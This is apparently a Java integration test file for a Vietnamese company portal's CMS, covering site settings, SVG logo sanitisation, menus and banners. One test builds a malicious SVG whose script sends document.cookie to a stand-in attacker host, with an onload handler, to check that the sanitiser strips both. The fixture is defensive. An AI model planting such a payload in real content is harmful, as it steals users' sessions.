package com.songnhue.app.cms;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.List;
import java.util.Set;
import java.util.UUID;

import javax.imageio.ImageIO;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.dao.DataIntegrityViolationException;
import org.springframework.jdbc.core.JdbcTemplate;

import com.songnhue.app.testsupport.CmsFixtures;
import com.songnhue.app.testsupport.IntegrationTestBase;
import com.songnhue.content.application.BannerService;
import com.songnhue.content.application.CategoryService;
import com.songnhue.content.application.MenuService;
import com.songnhue.content.application.SiteConfigService;
import com.songnhue.content.domain.Banner;
import com.songnhue.content.domain.MenuLinkType;
import com.songnhue.content.domain.MenuPosition;
import com.songnhue.core.application.settings.SettingService;
import com.songnhue.core.common.security.AuthContext;
import com.songnhue.core.common.security.AuthenticatedUser;
import com.songnhue.core.infra.storage.ObjectStorage;
import com.songnhue.core.spi.SettingItem;

/**
 * Cấu hình giao diện, menu và banner trên CSDL + MinIO thật — WS-15.
 *
 * <p><b>Bốn câu hỏi bài kiểm này phải trả lời</b>, và cả bốn đều là chỗ hỏng im lặng nếu sai:
 *
 * <ol>
 *   <li>Sửa một tham số ở màn hình <i>cấu hình hệ thống</i> thì cổng có thấy giá trị mới không? (bộ
 *       nhớ đệm ở hai tầng, hai đường sửa — T15.6)
 *   <li>Đường CMS có chạm được vào tham số bảo mật không? (phải là <b>không</b>, và ràng buộc phải
 *       nằm ở tầng dưới annotation phân quyền)
 *   <li>SVG có thật sự bị bóc phần chạy được <i>trên đường tải lên thật</i> không? (từ WS-14 tới
 *       trước WS-15, {@code SvgSanitizer} không có đường nào chạm tới)
 *   <li>Menu Header có kéo được một mục sang làm con của Footer không? (phải là <b>không</b>, ở cả
 *       tầng service lẫn tầng CSDL)
 * </ol>
 */
class SiteLayoutTest extends IntegrationTestBase {

    private static final String QUYEN_LAYOUT = "cms:layout:manage";
    private static final String QUYEN_BANNER = "cms:banner:manage";
    private static final String QUYEN_DANH_MUC = "cms:category:manage";

    @Autowired
    private SiteConfigService siteConfig;

    @Autowired
    private MenuService menus;

    @Autowired
    private BannerService banners;

    @Autowired
    private CategoryService categories;

    @Autowired
    private SettingService settings;

    @Autowired
    private ObjectStorage storage;

    @Autowired
    private JdbcTemplate jdbc;

    @BeforeEach
    void chuanBi() {
        CmsFixtures.donDep(jdbc);
        CmsFixtures.datLaiCauHinhSite(jdbc);
        dangNhap(QUYEN_LAYOUT, QUYEN_BANNER, QUYEN_DANH_MUC);
    }

    @AfterEach
    void ketThuc() {
        AuthContext.clear();
        CmsFixtures.donDep(jdbc);
        CmsFixtures.datLaiCauHinhSite(jdbc);
    }

    // ---- Cấu hình giao diện (T15.2–T15.4, T15.6) ------------------------------

    @Test
    @DisplayName("Cấu hình giao diện nằm ở nhóm SITE của settings, không có bảng riêng")
    void cauHinhNamOSettings() {
        List<SettingItem> items = siteConfig.list();

        assertThat(items).isNotEmpty();
        assertThat(items).allMatch(item -> "SITE".equals(item.groupCode()));
        assertThat(items)
                .extracting(SettingItem::key)
                .contains(
                        "site.name",
                        "site.logo.attachment-id",
                        "site.footer.copyright",
                        "site.slider.interval-seconds");
    }

    @Test
    @DisplayName("⛔ KHÔNG còn `site.home.blocks` / `site.slider.effect` — hai công tắc không ai đọc")
    void khongConCongTacBoCucChet() {
        assertThat(siteConfig.list())
                .as(
                        """
                        Cùng luật với bài ngay trên. `site.home.blocks` liệt kê SLIDER/FEATURED/NEWS/NOTICE —                         từ vựng có TRƯỚC cây nội dung mà Công ty duyệt 27/08/2026: CR-10 đã thay bài đinh                         (FEATURED) bằng slider ảnh, CR-01 đã bỏ mục Thông báo (NOTICE) khỏi cây nội dung.                         `site.slider.effect` thì chưa từng có nơi đọc. Cả hai gỡ ở V202608271032; bài này                         canh cho chúng không quay lại qua một lượt seed nào khác.""")
                .extracting(SettingItem::key)
                .doesNotContain("site.home.blocks", "site.slider.effect");
    }

    @Test
    @DisplayName("Tham số cổng của đợt chỉnh sửa 27/08/2026 có mặt và sửa được")
    void thamSoDotChinhSuaCoMat() {
        assertThat(siteConfig.list())
                .as(
                        """
                        §2 của "YÊU CẦU CHỈNH SỬA WEBSITE": chu kỳ refresh, số bài hiển thị, số ảnh slider,                         thời gian chuyển ảnh phải cấu hình được, không gán cứng trong mã nguồn. Bài này canh                         vế "có mặt"; vế "có nơi đọc" do PortalSettingsAreReadTest ở public-web canh.""")
                .extracting(SettingItem::key)
                .contains(
                        "site.external.doc-system-url",
                        "site.slider.max-items",
                        "site.home.news-count",
                        "site.home.documents-category",
                        "site.home.documents-count",
                        "site.page.production-progress-category",
                        "site.home.realtime.refresh-seconds");
    }

    @Test
    @DisplayName("⛔ KHÔNG có công tắc widget thuỷ văn — công tắc chưa ai đọc là công tắc lừa người dùng")
    void khongCoCongTacWidgetThuyVan() {
        assertThat(siteConfig.list())
                .as(
                        """
                        T15.5 ghi "giữ chỗ cấu hình", nhưng widget thuỷ văn cần MOD-03 (Phase 2) nên không \
                        dòng mã nào đọc được khoá đó. Bày ra một tham số như vậy là lặp lại đúng lỗi đã sửa \
                        ở WS-12: quản trị viên đặt giá trị, hệ thống báo lưu thành công, và không có gì \
                        thay đổi. Chỗ giữ là một khối bị khoá trên giao diện, không phải một dòng ở đây.""")
                .extracting(SettingItem::key)
                .noneMatch(key -> key.contains("hydro") || key.contains("thuy-van"));
    }

    @Test
    @DisplayName("⭐ Sửa tham số → giá trị mới thấy được NGAY, không chờ hết hạn bộ nhớ đệm")
    void suaThamSoCoHieuLucNgay() {
        // Nạp bộ nhớ đệm trước, để phép kiểm thật sự đi qua đường vô hiệu hoá.
        assertThat(siteConfig.effectiveValues().get("site.slogan")).isEmpty();

        siteConfig.update("site.slogan", "Vì dòng nước xanh");

        assertThat(siteConfig.effectiveValues().get("site.slogan")).isEqualTo("Vì dòng nước xanh");
    }

    @Test
    @DisplayName("⭐⭐ Sửa từ màn hình CẤU HÌNH HỆ THỐNG cũng làm cổng thấy ngay — nhờ sự kiện")
    void suaTuManHinhHeThongCungCoHieuLucNgay() {
        assertThat(siteConfig.effectiveValues().get("site.footer.copyright")).contains("Sông Nhuệ");

        // Đường thứ hai: API cấu hình hệ thống của MOD-05, không đi qua SiteConfigService.
        settings.update("site.footer.copyright", "© 2026 TLSN");

        assertThat(siteConfig.effectiveValues().get("site.footer.copyright"))
                .as(
                        """
                        Nếu SiteConfigService tự dọn bộ nhớ đệm trong hàm update của chính nó thì đường này \
                        không dọn gì cả: Quản trị viên hệ thống sửa xong, giao diện báo thành công, và cổng \
                        vẫn hiện giá trị cũ tới khi hết TTL — không lỗi, không dấu vết.""")
                .isEqualTo("© 2026 TLSN");
    }

    @Test
    @DisplayName("⛔ Đường CMS không chạm được tham số ngoài nhóm SITE")
    void duongCmsKhongChamDuocThamSoBaoMat() {
        String truoc = settings.getString("security.login.max-failed-attempts").orElseThrow();

        assertThatThrownBy(() -> siteConfig.update("security.login.max-failed-attempts", "999"))
                .as(
                        """
                        Chốt chặn phải nằm DƯỚI annotation phân quyền. Nếu chỉ dựa vào @RequirePermission \
                        thì giới hạn "CMS chỉ sửa được nhóm site" là một dòng người ta có thể quên.""")
                .hasMessageContaining("SYS-0004");

        assertThat(settings.getString("security.login.max-failed-attempts")).hasValue(truoc);
    }

    // ---- SVG đi qua đường tải lên thật (T14.6 + T15.2) ------------------------

    @Test
    @DisplayName("⭐⭐ Logo SVG có <script> — thứ lưu xuống kho đã bị bóc sạch phần chạy được")
    void logoSvgBiBocPhanChayDuoc() {
        byte[] doc =
                """
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                  <script>fetch('https://ke-tan-cong.example/?c=' + document.cookie)</script>
                  <rect width="100" height="100" fill="#1677ff" onload="alert(1)"/>
                </svg>
                """
                        .getBytes(StandardCharsets.UTF_8);

        UUID tep = siteConfig
                .uploadBrandImage(SiteConfigService.KEY_LOGO, "logo.svg", doc)
                .publicId();

        String noiDungDaLuu = new String(docTuKho(tep), StandardCharsets.UTF_8);

        assertThat(noiDungDaLuu)
                .as(
                        """
                        Đây là lần đầu SvgSanitizer nằm trên một đường chạy thật. Trước WS-15, \
                        FileValidator.detect() trả null cho mọi tệp SVG (SVG không có magic bytes) nên \
                        detectAndValidate từ chối chúng ở MỌI đường tải lên — kể cả đường mà chốt của dự \
                        án cho phép. Lớp khử trùng có bài kiểm riêng, xanh, và chưa bao giờ được gọi.""")
                .doesNotContain("<script")
                .doesNotContain("onload")
                .doesNotContain("document.cookie");
        assertThat(noiDungDaLuu)
                .as("bóc phần nguy hiểm nhưng phải giữ được hình vẽ — chỉ kiểm vế đầu thì hàm trả rỗng cũng xanh")
                .contains("<rect")
                .contains("#1677ff");

        assertThat(siteConfig.brandImageId(SiteConfigService.KEY_LOGO))
                .as("tải xong phải trỏ tham số vào tệp mới, nếu không thì logo tải lên mà cổng không dùng")
                .isEqualTo(tep);
    }

    @Test
    @DisplayName("Logo PNG vẫn đi đường mã hoá lại như mọi ảnh raster khác")
    void logoPngVanDiDuongMaHoaLai() {
        UUID tep = siteConfig
                .uploadBrandImage(SiteConfigService.KEY_LOGO, "logo.png", anhPng(32, 32))
                .publicId();

        assertThat(jdbc.queryForObject("SELECT content_type FROM attachments WHERE public_id = ?", String.class, tep))
                .isEqualTo("image/png");
    }

    @Test
    @DisplayName("⛔ Tệp không phải SVG nhưng đặt đuôi .svg vẫn bị từ chối")
    void doiDuoiSvgKhongLuaDuoc() {
        byte[] vanBan = "Đây chỉ là văn bản thuần.".getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> siteConfig.uploadBrandImage(SiteConfigService.KEY_LOGO, "logo.svg", vanBan))
                .as("phép đoán SVG bắt buộc mở đầu bằng một thẻ, nên tệp văn bản thường không lọt")
                .hasMessageContaining("SYS-0003");
    }

    // ---- Menu (T15.1) --------------------------------------------------------

    @Test
    @DisplayName("⭐ Cây menu trả về đủ đích đã phân giải — cha, danh mục, bài viết")
    void cayMenuTraVeDuDich() {
        UUID danhMuc = categories.create("Chuyên mục thử nghiệm", null, null).getPublicId();

        // ⚠ Nhãn phải khác nhãn của menu seed. Dùng lại "Giới thiệu" thì bộ lọc dưới đây bắt luôn cả
        // mục do migration tạo, và bài kiểm đếm ra một con số không phải của nó.
        MenuService.MenuNode cha =
                menus.create(MenuPosition.HEADER, null, "Nhóm thử nghiệm", MenuService.Target.none());
        menus.create(
                MenuPosition.HEADER,
                cha.publicId(),
                "Mục thử nghiệm",
                new MenuService.Target(MenuLinkType.CATEGORY, danhMuc, null, null));

        List<MenuService.MenuNode> cay = menus.tree(MenuPosition.HEADER).stream()
                .filter(n -> n.label().equals("Nhóm thử nghiệm") || n.label().equals("Mục thử nghiệm"))
                .toList();

        assertThat(cay).hasSize(2);
        assertThat(cay.get(0).label())
                .as("sắp theo path nên cha luôn đứng trước con")
                .isEqualTo("Nhóm thử nghiệm");
        assertThat(cay.get(1).parentPublicId()).isEqualTo(cha.publicId());
        assertThat(cay.get(1).categoryPublicId())
                .as(
                        """
                        Thiếu trường này thì biểu mẫu sửa mở ra với ô "Danh mục" trống ở mọi mục — người \
                        dùng bấm Lưu và mục menu mất đích, không có thông báo nào.""")
                .isEqualTo(danhMuc);
    }

    @Test
    @DisplayName("⛔ Mục con phải cùng vị trí với cha — CMS-2013")
    void mucConPhaiCungViTriVoiCha() {
        MenuService.MenuNode chaHeader =
                menus.create(MenuPosition.HEADER, null, "Giới thiệu", MenuService.Target.none());

        assertThatThrownBy(() -> menus.create(
                        MenuPosition.FOOTER,
                        chaHeader.publicId(),
                        "Mục lạc chỗ",
                        new MenuService.Target(MenuLinkType.URL, null, null, "/lac-cho")))
                .hasMessageContaining("CMS-2013");
    }

    @Test
    @DisplayName("⭐ CSDL cũng từ chối mục con khác vị trí — không chỉ tầng service")
    void csdlCungTuChoiMucConKhacViTri() {
        MenuService.MenuNode chaHeader =
                menus.create(MenuPosition.HEADER, null, "Cha Header", MenuService.Target.none());
        Long chaId =
                jdbc.queryForObject("SELECT id FROM menu_items WHERE public_id = ?", Long.class, chaHeader.publicId());

        assertThatThrownBy(() -> jdbc.update(
                        """
                        INSERT INTO menu_items (position, parent_id, label, link_type, url, path, depth, sort_order)
                        VALUES ('FOOTER', ?, 'Chèn thẳng bằng SQL', 'URL', '/x', '/999/', 1, 0)
                        """,
                        chaId))
                .as(
                        """
                        Ràng buộc này là lý do bảng có UNIQUE (id, position). Chặn ở service thôi thì một \
                        lượt seed hoặc một lượt sửa dữ liệu bằng tay vẫn dựng được cây sai, và cổng hiển \
                        thị sai mà không có lỗi nào.""")
                .isInstanceOf(DataIntegrityViolationException.class);
    }

    @Test
    @DisplayName("⛔ Menu sâu quá 3 cấp bị chặn — CMS-2010")
    void menuSauQuaBaCapBiChan() {
        MenuService.MenuNode c0 = menus.create(MenuPosition.HEADER, null, "Cấp 1", MenuService.Target.none());
        MenuService.MenuNode c1 = menus.create(MenuPosition.HEADER, c0.publicId(), "Cấp 2", MenuService.Target.none());
        MenuService.MenuNode c2 = menus.create(MenuPosition.HEADER, c1.publicId(), "Cấp 3", MenuService.Target.none());

        assertThat(c2.depth()).isEqualTo((short) 2);
        assertThatThrownBy(() -> menus.create(MenuPosition.HEADER, c2.publicId(), "Cấp 4", MenuService.Target.none()))
                .hasMessageContaining("CMS-2010");
    }

    @Test
    @DisplayName("⛔ Xoá mục còn mục con bị chặn — CMS-2011")
    void xoaMucConMucConBiChan() {
        MenuService.MenuNode cha = menus.create(MenuPosition.HEADER, null, "Cha", MenuService.Target.none());
        menus.create(MenuPosition.HEADER, cha.publicId(), "Con", MenuService.Target.none());

        assertThatThrownBy(() -> menus.delete(cha.publicId())).hasMessageContaining("CMS-2011");
    }

    @Test
    @DisplayName("⛔ Trỏ vào danh mục đã xoá mềm bị chặn — CMS-2012")
    void troVaoDanhMucDaXoaBiChan() {
        UUID danhMuc = categories.create("Danh mục sẽ xoá", null, null).getPublicId();
        categories.delete(danhMuc);

        assertThatThrownBy(() -> menus.create(
                        MenuPosition.HEADER,
                        null,
                        "Mục hỏng",
                        new MenuService.Target(MenuLinkType.CATEGORY, danhMuc, null, null)))
                .as("khoá ngoại không phân biệt được 'không tồn tại' với 'đã xoá mềm' — nên phải kiểm ở service")
                .hasMessageContaining("CMS-2012");
    }

    @Test
    @DisplayName("Đổi loại liên kết thì đích cũ được dọn sạch")
    void doiLoaiLienKetThiDonDichCu() {
        UUID danhMuc = categories.create("Tin tức nội bộ", null, null).getPublicId();
        MenuService.MenuNode muc = menus.create(
                MenuPosition.HEADER,
                null,
                "Tin tức",
                new MenuService.Target(MenuLinkType.CATEGORY, danhMuc, null, null));

        MenuService.MenuNode sau = menus.update(
                muc.publicId(),
                "Trang ngoài",
                new MenuService.Target(MenuLinkType.URL, null, null, "https://example.gov.vn"),
                true,
                true);

        assertThat(sau.categoryPublicId())
                .as("để nguyên đích cũ thì ràng buộc CSDL từ chối một thao tác hoàn toàn hợp lệ")
                .isNull();
        assertThat(sau.url()).isEqualTo("https://example.gov.vn");
    }

    // ---- Banner (T15.1) ------------------------------------------------------

    @Test
    @DisplayName("⭐ Lịch hiển thị quyết định banner có lên cổng hay không")
    void lichHienThiQuyetDinhBannerLenCong() {
        Instant now = Instant.now();
        UUID dangChay = banners.create("Đang chạy", "b1.png", anhPng(60, 20)).getPublicId();
        UUID chuaToi = banners.create("Chưa tới", "b2.png", anhPng(60, 20)).getPublicId();
        UUID daHet = banners.create("Đã hết", "b3.png", anhPng(60, 20)).getPublicId();

        banners.update(dangChay, "Đang chạy", null, null, false, true, now.minus(1, ChronoUnit.DAYS), null);
        banners.update(chuaToi, "Chưa tới", null, null, false, true, now.plus(1, ChronoUnit.DAYS), null);
        banners.update(
                daHet,
                "Đã hết",
                null,
                null,
                false,
                true,
                now.minus(10, ChronoUnit.DAYS),
                now.minus(1, ChronoUnit.DAYS));

        assertThat(banners.listVisible(now))
                .as("cột lịch tồn tại để không ai phải nhớ quay lại gỡ banner xuống bằng tay")
                .extracting(Banner::getTitle)
                .containsExactly("Đang chạy");
    }

    @Test
    @DisplayName("⛔ Ngày kết thúc không sau ngày bắt đầu — CMS-2014")
    void ngayKetThucPhaiSauNgayBatDau() {
        Instant now = Instant.now();
        UUID banner = banners.create("Banner", "b.png", anhPng(30, 10)).getPublicId();

        assertThatThrownBy(() ->
                        banners.update(banner, "Banner", null, null, false, true, now, now.minus(1, ChronoUnit.HOURS)))
                .hasMessageContaining("CMS-2014");
    }

    @Test
    @DisplayName("⛔ Banner không nhận SVG — chỉ màn hình nhận diện mới nhận")
    void bannerKhongNhanSvg() {
        byte[] svg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect/></svg>".getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> banners.create("Banner SVG", "banner.svg", svg))
                .hasMessageContaining("SYS-0003");
    }

    @Test
    @DisplayName("Tắt banner thì nó rời cổng ngay, kể cả khi còn trong lịch")
    void tatBannerThiRoiCongNgay() {
        Instant now = Instant.now();
        UUID banner = banners.create("Banner", "b.png", anhPng(30, 10)).getPublicId();
        banners.update(banner, "Banner", null, null, false, false, null, null);

        assertThat(banners.listVisible(now)).isEmpty();
        assertThat(banners.listAll()).as("tắt là ẩn khỏi cổng, không phải xoá").hasSize(1);
    }

    // ---- Khung đề xuất do migration seed (T15.7 + T13.13) --------------------

    @Test
    @DisplayName("⭐ Migration seed dựng đúng cây nội dung Công ty duyệt 27/08/2026")
    void migrationSeedDuKhungCong() {
        assertThat(jdbc.queryForObject(
                        "SELECT count(*) FROM articles WHERE created_by IS NULL AND status = 'XUAT_BAN' "
                                + "AND published_version_id IS NOT NULL AND deleted_at IS NULL",
                        Integer.class))
                .as(
                        """
                        Chỉ còn MỘT trang tĩnh do migration sở hữu: "Tổng quan". Ba trang cũ                         (chuc-nang-nhiem-vu · co-cau-to-chuc · lien-he) đã bị V202608271031 xoá mềm vì                         cây nội dung mới thay chúng bằng trang thật ở đường dẫn khác (CR-22/23/24).                         Trang tĩnh còn lại phải XUẤT BẢN và có bản phục vụ công khai — để ở Nháp thì                         mục menu trỏ vào nó trả 404.""")
                .isEqualTo(1);

        // ⭐ Ghim ĐÚNG bảy mục cấp 1 của §3 cộng lối sang hệ thống văn bản điều hành (CR-07).
        //    Đây là tiêu chí nghiệm thu viết thành phép khẳng định: §2 đòi menu chính, chân trang
        //    và card chuyên mục dùng CHUNG một hệ phân loại, nên hệ ấy phải có đúng một mô tả
        //    máy đọc được. Đổi thứ tự hay đổi tên một mục là một quyết định, và nó phải làm đỏ.
        assertThat(menus.tree(MenuPosition.HEADER))
                .filteredOn(node -> node.depth() == 0)
                .extracting(MenuService.MenuNode::label)
                .containsExactly(
                        "Trang chủ",
                        "Giới thiệu",
                        "Tin tức – Sự kiện",
                        "Hoạt động Đảng, đoàn thể",
                        "Quản lý, vận hành",
                        "Công bố thông tin",
                        "Liên hệ",
                        "Văn bản điều hành");

        // Bốn nhánh có menu con — CR-02, CR-03, CR-05, CR-06.
        assertThat(menus.tree(MenuPosition.HEADER))
                .filteredOn(node -> node.depth() == 1)
                .as("Giới thiệu 4 · Tin tức – Sự kiện 2 · Quản lý, vận hành 4 · Công bố thông tin 2")
                .hasSize(12);

        assertThat(menus.tree(MenuPosition.FOOTER))
                .as("CR-09: chân trang dùng đúng hệ phân loại của menu chính — bảy mục cấp 1")
                .hasSize(7);

        assertThat(menus.tree(MenuPosition.HEADER))
                .filteredOn(node -> node.linkType() == MenuLinkType.EXTERNAL_DOC)
                .singleElement()
                .satisfies(node -> {
                    assertThat(node.openNewTab())
                            .as("CR-07 + checklist §10: nút Văn bản điều hành phải mở TAB MỚI")
                            .isTrue();
                    assertThat(node.url())
                            .as(
                                    """
                                    CR-07 đổi đích sang hệ thống của Thành phố. `songnhue.bhh40.net` là hệ                                     thống văn bản CŨ của Công ty và cũng là nguồn API thuỷ văn của MOD-03 —                                     hai vai trò khác nhau trên cùng một host, nên nhầm chỗ này không lộ ra                                     ở đâu cả.""")
                            .contains("quanlyvanban.hanoi.gov.vn");
                });
    }

    @Test
    @DisplayName("⛔ Mọi mục menu seed có đích giải được, và cha luôn đứng trước con")
    void pathCuaMenuSeedDung() {
        List<MenuService.MenuNode> header = menus.tree(MenuPosition.HEADER);

        /*
          ⚠ Bản trước khẳng định "ba mục con của Giới thiệu đều trỏ tới trang tĩnh" — một mô tả
            HÌNH DẠNG của cây menu tháng 8, nên nó đỏ ngay lượt Công ty duyệt cây nội dung mới,
            dù không có gì hỏng. Bài kiểm phải nói về BẤT BIẾN, không về hình dạng hiện thời:
            hình dạng đã có `migrationSeedDuKhungCong` ghim riêng, còn ở đây là hai điều luôn
            phải đúng với mọi cây menu.
        */
        assertThat(header)
                .filteredOn(node -> node.depth() == 1)
                .as("phải có mục con để kiểm — chạy qua tập rỗng thì xanh mà không canh gì (luật 7)")
                .isNotEmpty();

        for (MenuService.MenuNode node : header) {
            if (node.depth() > 0) {
                assertThat(node.parentPublicId())
                        .as("mục '%s' ở cấp %d mà không có cha", node.label(), node.depth())
                        .isNotNull();
                int viTriCha = header.indexOf(header.stream()
                        .filter(x -> x.publicId().equals(node.parentPublicId()))
                        .findFirst()
                        .orElseThrow(() -> new AssertionError("không tìm thấy cha của " + node.label())));
                assertThat(viTriCha)
                        .as("cha của '%s' đứng SAU nó — buildMenuTree ở public-web duyệt một lượt", node.label())
                        .isLessThan(header.indexOf(node));
            }

            // ⛔ Đích giải được. Một mục `CATEGORY` không có slug, hay `URL` không có url, sẽ
            //    render thành thẻ không bấm được ở cổng — mất một lối vào mà không có lỗi nào.
            switch (node.linkType()) {
                case CATEGORY ->
                    assertThat(node.categorySlug())
                            .as("mục '%s' kiểu CATEGORY nhưng không có slug", node.label())
                            .isNotBlank();
                case ARTICLE ->
                    assertThat(node.articlePublicId())
                            .as("mục '%s' kiểu ARTICLE nhưng không trỏ tới bài nào", node.label())
                            .isNotNull();
                case URL, EXTERNAL_DOC ->
                    assertThat(node.url())
                            .as("mục '%s' kiểu %s nhưng không có đường dẫn", node.label(), node.linkType())
                            .isNotBlank();
                case NONE ->
                    assertThat(header)
                            .filteredOn(x -> node.publicId().equals(x.parentPublicId()))
                            .as("mục '%s' kiểu NONE (chỉ mở menu con) mà KHÔNG có mục con nào", node.label())
                            .isNotEmpty();
                // ⚠ Nhánh này không chạy với năm giá trị hiện có của `MenuLinkType`, và đó chính
                //   là lý do nó phải ném. Thêm một loại liên kết thứ sáu mà quên khai cách giải
                //   đích của nó thì bài kiểm nói ra ngay, thay vì lặng lẽ bỏ qua mọi mục kiểu ấy.
                default -> throw new AssertionError("kiểu liên kết chưa khai cách giải đích: " + node.linkType());
            }
        }
    }

    // ---- Trợ giúp ------------------------------------------------------------

    private byte[] docTuKho(UUID attachmentPublicId) {
        String bucket = jdbc.queryForObject(
                "SELECT storage_bucket FROM attachments WHERE public_id = ?", String.class, attachmentPublicId);
        String key = jdbc.queryForObject(
                "SELECT storage_key FROM attachments WHERE public_id = ?", String.class, attachmentPublicId);
        return storage.get(bucket, key);
    }

    private static byte[] anhPng(int rong, int cao) {
        try {
            BufferedImage anh = new BufferedImage(rong, cao, BufferedImage.TYPE_INT_RGB);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ImageIO.write(anh, "png", out);
            return out.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException("Không dựng được ảnh cho bài kiểm", e);
        }
    }

    private static void dangNhap(String... quyen) {
        AuthContext.set(new AuthenticatedUser(
                1L,
                UUID.randomUUID(),
                "layout-probe",
                "Người kiểm thử",
                1L,
                "/1/",
                Set.of("PROBE"),
                Set.of(quyen),
                false,
                UUID.randomUUID(),
                UUID.randomUUID()));
    }
}
